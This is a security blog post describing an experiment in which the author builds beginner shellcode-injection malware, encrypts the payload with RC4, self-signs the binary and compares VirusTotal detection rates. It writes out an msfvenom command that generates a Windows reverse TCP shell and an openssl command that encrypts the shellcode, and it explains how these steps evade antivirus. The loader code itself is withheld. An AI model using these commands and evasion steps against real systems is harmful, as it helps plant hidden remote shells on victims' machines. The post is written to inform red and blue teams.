<!doctype html>
<html lang="en-us">
  <head>
    <title>Reducing Malware Detections with Signing and Encryption // ghsinfosec</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.92.2" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="ghsinfosec" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
    

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Reducing Malware Detections with Signing and Encryption"/>
<meta name="twitter:description" content="Lately I&rsquo;ve taken a detour down the rabbit hole of malware development (as one does&hellip;) and I think it deserves a look if you work in cybersecurity. The inspiration for this comes from the MalDev Academy main modules for developing malware. After working through some of the material again I wanted to share some interesting things that I&rsquo;ve learned and observed as it relates to malware detection.
Specifically we&rsquo;re going to look at how payload encryption and binary signing significantly reduces detection rates based on tests with VirusTotal."/>

    <meta property="og:title" content="Reducing Malware Detections with Signing and Encryption" />
<meta property="og:description" content="Lately I&rsquo;ve taken a detour down the rabbit hole of malware development (as one does&hellip;) and I think it deserves a look if you work in cybersecurity. The inspiration for this comes from the MalDev Academy main modules for developing malware. After working through some of the material again I wanted to share some interesting things that I&rsquo;ve learned and observed as it relates to malware detection.
Specifically we&rsquo;re going to look at how payload encryption and binary signing significantly reduces detection rates based on tests with VirusTotal." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ghsinfosec.github.io/posts/reducing-malware-detections-with-signing-and-encryption/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2026-01-16T14:40:27-05:00" />
<meta property="article:modified_time" content="2026-01-16T14:40:27-05:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://ghsinfosec.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="ghsinfosec" /></a>
      <span class="app-header-title">ghsinfosec</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">/home</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/">/tags</a>
             - 
          
          <a class="app-header-menu-item" href="/about/">/about</a>
      </nav>
      <p>Welcome to my blog, where everything&#39;s made up and the views don&#39;t matter!</p>
      <div class="app-header-social">
        
          <a href="https://github.com/ghsinfosec" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
<article class="post">
  <header class="post-header">
    <h1 class="post-title">Reducing Malware Detections with Signing and Encryption</h1>
    <div class="post-meta">
      <div>
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg> Jan 16, 2026
      </div>
      <div>
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg> 5 min read
      </div>
      <div>
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg><a class="tag" href="https://ghsinfosec.github.io/tags/malware/">malware</a><a class="tag" href="https://ghsinfosec.github.io/tags/offensive-security/">offensive security</a>
      </div>
    </div>
  </header>
  <div class="post-content"><p>Lately I&rsquo;ve taken a detour down the rabbit hole of malware development (as one does&hellip;) and I think it deserves a look if you work in cybersecurity. The inspiration for this comes from the <a href="https://maldevacademy.com">MalDev Academy</a> main modules for developing malware. After working through some of the material again I wanted to share some interesting things that I&rsquo;ve learned and observed as it relates to malware detection.</p>
<p>Specifically we&rsquo;re going to look at how payload encryption and binary signing significantly reduces detection rates based on tests with <a href="https://virustotal.com">VirusTotal</a>. There are so many ways that malware tries to hide itself and this is a vast subject. But in this post we&rsquo;re going to keep it simple to demonstrate how just a small amount of effort can have great effects in avoiding detection.</p>
<h2 id="background">Background</h2>
<p>While I was working through the material I was curious how easily these techniques would be to detect. To be clear, I&rsquo;ve only completed about 33% of the training material so up to this point it has been relatively simple to work with. There were no advanced techniques used here (i.e. module stomping, direct/indirect syscalls, native API calls, etc.).</p>
<p>The training even states that these are introductory techniques that <em>will get detected</em> and they&rsquo;re not recommended for real malware/red team ops. For my testing purposes this is great because the results will paint a more accurate picture of the effectiveness when beginning to think about detection avoidance. I want this to get detected to determine how effective encryption and signing really are.</p>
<p>These are the parameters for the test:</p>
<ul>
<li>standard Windows API&rsquo;s are used (<code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code>)</li>
<li>the payload is generated with msfvenom, which is highly signatured</li>
<li>binary signing is done with a self-signed certificate, which is untrusted</li>
</ul>
<p>Four binaries will be uploaded to VirusTotal for the test:</p>
<ol>
<li>Unsigned with raw msfvenom-generated shellcode</li>
<li>Signed with raw shellcode</li>
<li>Unsigned with RC4 encrypted shellcode</li>
<li>Signed with RC4 encrypted shellcode</li>
</ol>
<blockquote>
<p>Disclaimer: I&rsquo;m not going to include any code for this post because the code I used for this experiment is not all mine. Some of it I was able to work out myself, but the bulk of it is copy pasta from MalDev Academy and I don&rsquo;t want to violate any terms or misrepresent my skillset. I&rsquo;m still learning this stuff and may not get some things completely right so please take that into consideration when reading this!</p>
</blockquote>
<h2 id="getting-started">Getting Started</h2>
<p>We&rsquo;ve got to have some shellcode if we want to test things out right? So we&rsquo;ll use the following command to generate a classic hacker favorite, a TCP reverse shell in the raw ðŸ˜Ž</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>172.23.152.31 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9001</span> -f raw -o revshell.bin
</code></pre></div><p>This will generate a <em>stageless</em> payload so we can use netcat as our listener. A staged payload would be fine if you like using metasploit&rsquo;s handler.</p>
<p>Once we have the shellcode we can encrypt it with <code>openssl</code> by running this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat revshell.bin | openssl rc4 -nosalt -k <span style="color:#e6db74">&#34;arandomkey123&#34;</span> &gt; revshell_encrypted.bin
</code></pre></div><p>Since I&rsquo;m not including code with this post I&rsquo;m not going to paste the payloads here. The point here was just to showcase the simplicity used in getting the encrypted shellcode using a common tool.</p>
<p>All that&rsquo;s left to do is stage the payload(s) in your favorite delivery mechanism and before you know it &hellip;</p>
    
<img
  src="/images/baby-you-got-a-stew-goin_huff3c05e7430486da915592c87cc74116_339971_450x0_resize_box_3.png"
  width="450"
  height="293"
/>



<h2 id="testing-execution">Testing Execution</h2>
<p>Before uploading anything to VirusTotal we need to take it for a spin and be sure it&rsquo;s working. I used WSL on my host machine with a netcat listener on port 9001 (because it&rsquo;s greater than 9000), but any ol' port will do. Running the executable from my maldev academy VM (included with the course - not sponsored btw&hellip;) we can see here that we got a shell back&hellip; nice ðŸ”¥</p>
    
<img
  src="/images/testing-execution_hucd3780c2fbf52c3526024693bb9bb66c_97970_800x0_resize_box_3.png"
  width="800"
  height="476"
/>



<h2 id="signing-the-binaries">Signing the Binaries</h2>
<p>The final piece of the puzzle is signing the malware. Since we&rsquo;ve got two versions (one encrypted and one just straight up raw dog shellcode) we need to sign them both. Before doing this, I made copies of each one so we can test:</p>
<ul>
<li>Unsigned raw shellcode</li>
<li>Signed raw shellcode</li>
<li>Unsigned encrypted shellcode</li>
<li>Signed encrypted shellcode</li>
</ul>
<p>If my maths are right that&rsquo;s four tests&hellip;</p>
<p>To sign the malware I generated a self-signed certificate, brought to you by <code>openssl</code>, to make the malware look as legit as possible.</p>
    
<img
  src="/images/signed-binary-details_hu73850b15eedca9edcea44fa8bb612c99_72108_800x0_resize_box_3.png"
  width="800"
  height="774"
/>



<p>We&rsquo;re ready to cook&hellip;</p>
<h2 id="uploading-the-binaries-to-virustotal">Uploading the Binaries to VirusTotal</h2>
<p>With a working piece of malware we&rsquo;ll start with the no-kidding-i-am-ackshually-malware raw shellcode version that should obviously get picked up:</p>
<p><strong>Unsigned Raw Shellcode</strong></p>
    
<img
  src="/images/vt-unsigned-results-rawdawg_huc2099f6abc4fc7d682c68ac439512305_96503_900x0_resize_box_3.png"
  width="900"
  height="370"
/>



<p>Surprisingly not as many detections as I expected, but it&rsquo;s a good start and it&rsquo;s definitely getting detected!</p>
<p><strong>Signed Raw Shellcode</strong></p>
    
<img
  src="/images/vt-signed-results-rawdawg_hu57eb9d9c22f049ffb08ca559cf6c202f_99698_900x0_resize_box_3.png"
  width="900"
  height="374"
/>



<p>Signing the raw shellcode proved to be a bit of a benefit in terms of avoiding detection, but is a long shot from where an implant should be in a red team op.</p>
<p><strong>Unsigned Encrypted Shellcode</strong></p>
    
<img
  src="/images/vt-unsigned-results_hu295e7a16f4be498b77f589125cc998ff_107958_900x0_resize_box_3.png"
  width="900"
  height="549"
/>



<p>With encryption only we reduce detection even further, which I expected to have a great effect, but not this much.</p>
<p><strong>Signed Encrypted Shellcode</strong></p>
    
<img
  src="/images/vt-signed-results_huf0514a0e93f139dc942b7ba0eff8481a_95953_900x0_resize_box_3.png"
  width="900"
  height="555"
/>



<p>This final result is a far cry from what I expected to happen. The signed and encrypted piece of malware only flagged as malicious by six security vendors! This is a huge win from a red team perspective, especially considering the parameters that were defined for this test.</p>
<p>It&rsquo;s not perfect by any means and there are probably some major caveats regarding this testing methodology that are too deep to dive into in this post. But this has been an insightful exercise.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Even with a well-known, highly signatured payload generated with <code>msfvenom</code>, a self-signed certificate, and &ldquo;novice&rdquo; malware techniques using standard Windows APIs can have a massive effect in avoiding detection. As I said before, I&rsquo;m not an expert and this is nothing necessarily groundbreaking, but whether you are a red teamer or a blue teamer I think this is something to be aware of.</p>
</div>
  <div class="post-footer"></div>
</article>

    </main>
  </body>
</html>
